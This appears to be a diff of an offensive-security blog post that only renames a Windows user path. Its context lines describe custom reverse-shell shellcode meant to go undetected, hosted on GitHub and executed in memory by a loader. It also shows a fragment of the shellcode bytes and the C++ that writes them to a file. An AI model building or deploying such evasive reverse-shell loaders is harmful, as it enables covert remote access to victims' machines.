@@ -119,7 +119,7 @@ int main() {
 }
 ```
 
-Also here is the code I used to export my shellcode to a file to be loaded by our shellcode loader.  Yeah I know, the shellcode is impossibly large and should be much smaller.  😸  It's my own custom reverse shell shellcode, so no msfvenom was used.  I didn't put too much effort into reducing the amount of total bytes, I really just focused on shellcode that was reliable and undetected out of the gate.  I took the exported file, c:\\users\\robbi\\reg.dyno, and uploaded it to one of my github repos.  That is the file we download, which contains our shellcode, and gets executed in memory.
+Also here is the code I used to export my shellcode to a file to be loaded by our shellcode loader.  Yeah I know, the shellcode is impossibly large and should be much smaller.  😸  It's my own custom reverse shell shellcode, so no msfvenom was used.  I didn't put too much effort into reducing the amount of total bytes, I really just focused on shellcode that was reliable and undetected out of the gate.  I took the exported file, c:\\users\\g3tsyst3m\\reg.dyno, and uploaded it to one of my github repos.  That is the file we download, which contains our shellcode, and gets executed in memory.
 
 ```cpp
 #include <fstream>
@@ -159,7 +159,7 @@ int main() {
 0xc0,0x49,0x89,0xc1,0x48,0x89,0xca,0x48,0x89,0xc1,0x41,0xff,0xd6,0x48,0x31,0xc9,0xff,0xd3
     };
 
-    std::ofstream file("c:\\users\\robbi\\reg.dyno", std::ios::binary);
+    std::ofstream file("c:\\users\\g3tsyst3m\\reg.dyno", std::ios::binary);
     if (!file) {
         return 1;
     }
